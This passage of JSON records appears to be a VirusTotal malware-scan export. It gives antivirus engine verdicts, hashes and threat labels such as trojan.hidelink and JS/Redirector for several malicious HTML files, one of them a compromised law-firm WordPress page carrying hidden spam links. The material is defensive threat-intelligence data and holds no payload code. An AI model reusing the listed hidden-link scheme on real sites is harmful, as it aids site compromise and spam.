          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.142.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36062",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.36614B:27.33402",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Google": {
          "category": "undetected",
          "engine_name": "Google",
          "engine_version": "1696611657",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-06.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/Script.INF!tr",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "HTML:Script-inf [Susp]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230927"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        }
      }
    },
    "type": "file",
    "id": "d59460912d910d828d288cd433c07acf6c4a52997355267da7b58862a48d68b5",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/d59460912d910d828d288cd433c07acf6c4a52997355267da7b58862a48d68b5"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fb0448448ff030e486a3"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [
        "1118610",
        "aa",
        "ymqoY7dNJ.com",
        "N16wlznP1.bz2"
      ],
      "last_modification_date": 1706353170,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 7446,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.redirecn/scrscr",
        "popular_threat_category": [
          {
            "count": 14,
            "value": "trojan"
          },
          {
            "count": 2,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 2,
            "value": "redirecn"
          },
          {
            "count": 2,
            "value": "scrscr"
          }
        ]
      },
      "last_submission_date": 1323295845,
      "last_analysis_results": {
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "12.0.250.0",
          "result": "Trojan.JS.Clicker.ACR",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "nProtect": {
          "category": "malicious",
          "engine_name": "nProtect",
          "engine_version": "2013-09-12.03",
          "result": "Trojan.JS.Clicker.ACR",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "12.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "5.600.0.1067",
          "result": "Generic Downloader.ce",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "1.75.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "9.172.9570",
          "result": "Trojan",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.7.0.14",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.8.0.4.327",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "0.26.0.54404",
          "result": "Trojan.Url.Ext.iooc",
          "method": "blacklist",
          "engine_update": "20130911"
        },
        "F-Prot": {
          "category": "malicious",
          "engine_name": "F-Prot",
          "engine_version": "4.7.1.166",
          "result": "JS/ScrScr.B",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "20131.1.5.61",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Norman": {
          "category": "malicious",
          "engine_name": "Norman",
          "engine_version": "7.01.04",
          "result": "Redirect.W",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "TotalDefense": {
          "category": "malicious",
          "engine_name": "TotalDefense",
          "engine_version": "37.0.10498",
          "result": "JS/Redirector.C",
          "method": "blacklist",
          "engine_update": "20130911"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.700.0.1001",
          "result": "JS_REDIRECN.SM",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "8.0.1489.320",
          "result": "JS:Redirector-AD [Trj]",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.97.3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "9.0.0.837",
          "result": "Trojan-Clicker.HTML.Agent.aq",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.JS.Clicker.ACR",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Agnitum": {
          "category": "malicious",
          "engine_name": "Agnitum",
          "engine_version": "5.5.1.3",
          "result": "JS.Iframe.R",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1008",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "3.0.0.589",
          "result": "Trojan.JS.Clicker.ACR (B)",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Comodo": {
          "category": "malicious",
          "engine_name": "Comodo",
          "engine_version": "16925",
          "result": "TrojWare.JS.TrojanClicker.Agent.hb",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "11.0.19100.45",
          "result": "Trojan.JS.Clicker.ACR",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "21412",
          "result": "Trojan-Clicker.HTML.RemoteScript (v)",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "AntiVir": {
          "category": "malicious",
          "engine_name": "AntiVir",
          "engine_version": "7.11.102.58",
          "result": "HTML/Rce.Gen3",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "9.740.0.1012",
          "result": "JS_REDIRECN.SM",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "2013",
          "result": "Heuristic.LooksLike.HTML.Infected.E",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "4.91.0",
          "result": "Mal/Badsrc-E",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130903"
        },
        "Baidu-International": {
          "category": "undetected",
          "engine_name": "Baidu-International",
          "engine_version": "3.5.1.41473",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "2.0.3.7",
          "result": "Trojan/HTML.Agent",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "2013.4.9.267",
          "result": "JS.SuspicionEpt",
          "method": "blacklist",
          "engine_update": "20130829"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.9800",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2011.4.7.4223",
          "result": "HTML.Downloader_Geno_iframe",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "2013.09.13.00",
          "result": "HTML/Agent",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "22",
          "result": "Trojan.JS.Clicker.ACR",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Commtouch": {
          "category": "malicious",
          "engine_name": "Commtouch",
          "engine_version": "5.4.1.7",
          "result": "JS/ScrScr.B",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "ByteHero": {
          "category": "undetected",
          "engine_name": "ByteHero",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130903"
        },
        "VBA32": {
          "category": "malicious",
          "engine_name": "VBA32",
          "engine_version": "3.12.24.2",
          "result": "Trojan-Clicker.HTML.IFrame.kr",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "PCTools": {
          "category": "undetected",
          "engine_name": "PCTools",
          "engine_version": "9.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "8792",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "24.79.02.04",
          "result": null,
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "T3.1.5.4.0",
          "result": "Trojan-Clicker.HTML.Agent",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "5.1.147.0",
          "result": "HTML/Redirector.CLK!tr",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "10.0.0.1190",
          "result": "JS/Redir",
          "method": "blacklist",
          "engine_update": "20130912"
        },
        "Panda": {
          "category": "malicious",
          "engine_name": "Panda",
          "engine_version": "10.0.3.5",
          "result": "JS/Redirector.gen",
          "method": "blacklist",
          "engine_update": "20130912"
        }
      },
      "trid": [
        {
          "file_type": "HyperText Markup Language",
          "probability": 100
        }
      ],
      "sha256": "83b0070888950b4c884ca38a52896ddbef2c0c7b5bf3b00f3a1183d5c41f401e",
      "type_extension": "html",
      "tags": [
        "html"
      ],
      "last_analysis_date": 1379013954,
      "unique_sources": 1,
      "first_submission_date": 1323295845,
      "ssdeep": "192:h4o3X6x2tfWF7/q3HE7/5MlModz/YwzeH2Ga+:hpi7/q3kZ",
      "packers": {
        "F-PROT": "doc_write"
      },
      "md5": "7a07e29dd5901125f7c3416f05a4a1fc",
      "sha1": "02b8eff4370f03ca295e5540dff1352652bfc755",
      "magic": "HTML document text",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 0,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 32,
        "undetected": 15
      },
      "meaningful_name": "1118610",
      "reputation": -7
    },
    "type": "file",
    "id": "83b0070888950b4c884ca38a52896ddbef2c0c7b5bf3b00f3a1183d5c41f401e",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/83b0070888950b4c884ca38a52896ddbef2c0c7b5bf3b00f3a1183d5c41f401e"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fb2b48448ff030e486b0"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T16AE2A5B81C49E9BF0943D905F9F9EE64D99BA1A9DB059BC0E3F8045CA742FC1D22538C",
      "vhash": "htm:81c30bcc061e33357f3e7e55576f4cf8",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [],
      "last_modification_date": 1706335123,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 32730,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.hidelink",
        "popular_threat_category": [
          {
            "count": 25,
            "value": "trojan"
          },
          {
            "count": 3,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 16,
            "value": "hidelink"
          }
        ]
      },
      "html_info": {
        "html_meta": {
          "keywords": [
            ","
          ],
          "description": [
            "Wills, Trusts, & Estates Glenn Roy Law is associated with a tax attorney, financial advisors and brokers, and other professionals to assist clients with d"
          ],
          "generator": [
            "WordPress 3.4.1"
          ]
        },
        "title": "Wills, Trusts, & Estates - Attorney at Law - William Glenn Roy Jr.",
        "hrefs": [
          "http://www.glennroylaw.com/preview/feed/",
          "http://www.glennroylaw.com/preview/xmlrpc.php",
          "http://www.glennroylaw.com/preview/areas-of-practice/wills-trusts-estates/",
          "http://www.glennroylaw.com/preview/comments/feed/",
          "http://www.glennroylaw.com/preview/areas-of-practice/wills-trusts-estates/feed/",
          "http://www.glennroylaw.com/preview/wp-content/plugins/wp-invoice/core/template/wpi-default-style.css?ver=3.07.0",
          "http://www.glennroylaw.com/preview/wp-content/plugins/nextgen-gallery/css/nggallery.css?ver=1.0.0",
          "http://www.glennroylaw.com/preview/wp-content/plugins/nextgen-gallery/shutter/shutter-reloaded.css?ver=1.3.4",
          "http://www.glennroylaw.com/preview/wp-content/plugins/contact-form-7/styles.css?ver=3.1.2",
          "http://www.glennroylaw.com/preview/wp-content/themes/striking/css/screen.css?ver=3.4.1",
          "http://www.glennroylaw.com/preview/wp-content/themes/striking/cache/skin.css?ver=1630818829",
          "http://www.glennroylaw.com/preview/xmlrpc.php?rsd",
          "http://www.glennroylaw.com/preview/wp-includes/wlwmanifest.xml",
          "http://www.glennroylaw.com/preview/wp-content/plugins/social-media-widget/social_widget.css",
          "http://www.allwomeninmedia.org/",
          "http://radicalcartography.net/",
          "http://www.ims.org/",
          "http://www.acworth.org/",
          "http://ignitionlabs.com.au/",
          "http://atp-innovations.com.au/",
          "http://quantumsensations.fr/",
          "http://bikewalk.org/",
          "http://opengear.org.uk/",
          "http://www.aepiiota.com/",
          "http://www.afca.com/",
          "http://www.cyclopedie.fr/",
          "http://www.theinformationlab.co.uk/",
          "http://www.fareshare.org.uk/",
          "http://gangoffour.co.uk/",
          "http://kingsofwar.org.uk/",
          "http://www.asiapacificmemo.ca/",
          "http://simply.ca/",
          "http://mdg.devex.com/",
          "http://www.trashbags.net.au/",
          "http://www.diveo.net/",
          "http://flickrslideshow.com/",
          "http://strokecongress.ca/",
          "http://uklgig.org.uk/",
          "http://opentec.org/",
          "http://aes2012.com.au/",
          "http://html5accessibility.com/",
          "http://samuelslibrary.net/",
          "http://whiteprivilegeconference.com/",
          "http://www.glennroylaw.com/preview/",
          "http://www.glennroylaw.com/preview/areas-of-practice/",
          "http://www.glennroylaw.com/preview/areas-of-practice/real-estate-law/",
          "http://www.glennroylaw.com/preview/areas-of-practice/family-law/",
          "http://www.glennroylaw.com/preview/areas-of-practice/corporate-and-busines-law/",
          "http://www.glennroylaw.com/preview/areas-of-practice/construction-law/",
          "http://www.glennroylaw.com/preview/areas-of-practice/eminent-domain/",
          "http://www.glennroylaw.com/preview/areas-of-practice/civil-commercial-litigation/",
          "http://www.glennroylaw.com/preview/areas-of-practice/foreclosures/",
          "http://www.glennroylaw.com/preview/areas-of-practice/asset-protection-planning/",
          "http://www.glennroylaw.com/preview/areas-of-practice/bankruptcy-law/",
          "http://www.glennroylaw.com/preview/areas-of-practice/fair-debt-collection-act/",
          "http://www.glennroylaw.com/preview/areas-of-practice/insurance-complaints/",
          "http://www.glennroylaw.com/preview/areas-of-practice/land-use-law-and-development/",
          "http://www.glennroylaw.com/preview/areas-of-practice/computer-law-and-e-discovery/",
          "http://www.glennroylaw.com/preview/attorney/",
          "http://www.glennroylaw.com/preview/links-3/",
          "http://www.glennroylaw.com/preview/category/law/",
          "http://www.glennroylaw.com/preview/location/",
          "http://www.glennroylaw.com/preview/contact/",
          "http://www.glennroylaw.com/preview/admin/",
          "http://www.glennroylaw.com/preview/wp-content/uploads/2012/05/will_trusts-estates-lawyers.jpg",
          "http://www.glennroylaw.com/preview/client-access/",
          "http://www.glennroylaw.com/preview/payments/",
          "http://www.glennroylaw.com/preview/shop/",
          "http://www.glennroylaw.com/preview/cart/",
          "http://www.glennroylaw.com/preview/checkout/",
          "http://www.glennroylaw.com/preview/personal/",
          "http://www.glennroylaw.com/preview/login/",
          "http://www.glennroylaw.com/preview/logout/",
          "http://www.glennroylaw.com/preview/register/",
          "http://www.glennroylaw.com/preview/test-law-post/",
          "http://www.glennroylaw.com/preview/second-law-case/",
          "http://www.glennroylaw.com/preview/third-law-article/",
          "www.facebook.com",
          "http://www.linkedin.com/",
          "www.page2rss.com",
          "mailto:",
          "mailto:inquiry*glennroylaw.com",
          "http://www.akawebsites.com",
          "http://www.glennroylaw.com/preview/privacy/"
        ],
        "scripts": [
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "35f452c7a2eea9245cb69964682685f0c1bf3d6df55a57faa99b3e7d1c6188a3"
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/plugins/nextgen-gallery/shutter/shutter-reloaded.js?ver=1.3.3",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-includes/js/jquery/jquery.js?ver=1.7.2",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/plugins/nextgen-gallery/js/jquery.cycle.all.min.js?ver=2.9995",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/plugins/nextgen-gallery/js/ngg.slideshow.min.js?ver=1.06",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/themes/striking/js/jqueryslidemenu.js?ver=3.4.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/themes/striking/js/jquery.tools.tabs.min.js?ver=1.2.5",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/themes/striking/js/jquery.colorbox-min.js?ver=1.3.19",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-includes/js/swfobject.js?ver=2.2-20120417",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/themes/striking/js/custom.js?ver=3.4.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-includes/js/comment-reply.js?ver=3.4.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/themes/striking/js/jquery.tools.validator.min.js?ver=1.2.5",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/themes/striking/js/cufon-yui.js?ver=1.09i",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/themes/striking/fonts/Segan_300.font.js?ver=3.4.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "f145a8cef5f4dbbb75c27184c3a90cf5c27220430acaa25ad1ad4194bf430adf"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "cf3a1e7346fb413a068b82f4662ca17e324f7f78a8e4ba6eaed7ea858975e6f4"
          },
          {
            "attributes": {
              "language": "JavaScript"
            },
            "sha256": "8c97582a251fb29e2caa61b4e5bf35b55f6149e8ed76d880295930cfe3962ee6"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "42e1e05250a99f318e12e7d05c7f02941470b8a03d407622ee8a02e15da30ba6"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "84ce9baf84128422fd7745394213c8af0880db12c909db322beb7e723055b082"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "583ffd9a711baeea7b8e81f4ae3b9436be08f7013de077cee8faf544456fb0b4"
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/plugins/contact-form-7/jquery.form.js?ver=3.08",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "73d929df2c82bd34401d5f4875e655786f7938e479b5d65e8f85657978ca30db"
          },
          {
            "attributes": {
              "src": "http://www.glennroylaw.com/preview/wp-content/plugins/contact-form-7/scripts.js?ver=3.1.2",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "b235465d50fc59172112abde1524c74b43bda770316ceddbbb87616c9afcffd2"
          }
        ]
      },
      "last_submission_date": 1703749468,
      "reputation": -7,
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "557079ea8aa44adba6191b9037911c79296b2606ebe2c75a95673e6112f0cfc3",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1703816936,
      "unique_sources": 1,
      "first_submission_date": 1703749468,
      "ssdeep": "768:oXHEm266iPdODJsQgI2kgwt75bGxbK8CJ/PQ1an3bd6/jAba:oUm266iPdODJsRktHbGxbJCJQ1Ad6/jj",
      "md5": "7970594817d15c0dd84214468f826380",
      "sha1": "7ea330945e61788b9e1f909f4a3bdcce1d5b7495",
      "magic": "HTML document, Unicode text, UTF-8 text, with very long lines (6201u), with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 1,
        "failure": 0,
        "malicious": 46,
        "undetected": 13
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.HTML.HideLink.a!c",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Js.Trojan.Obfus-633",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.HideLink.1",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Trojan.Hidelink.A",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.HTML.Redirector.nq",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "McAfee": {
          "category": "malicious",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": "JS/Redirector.bz",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Zillya": {
          "category": "malicious",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5022",
          "result": "Trojan.HideLink.JS.1",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "Trojan.Generic-Script.Save.a69b3cd8",
          "method": "blacklist",
          "engine_update": "20231227"
        },
        "K7AntiVirus": {
          "category": "malicious",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.132.50563",
          "result": "Trojan ( 0053d3381 )",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "malicious",
          "engine_name": "K7GW",
          "engine_version": "12.132.50565",
          "result": "Trojan ( 0053d3381 )",
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.HideLink.1",
          "method": "blacklist",
          "engine_update": "20231228"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
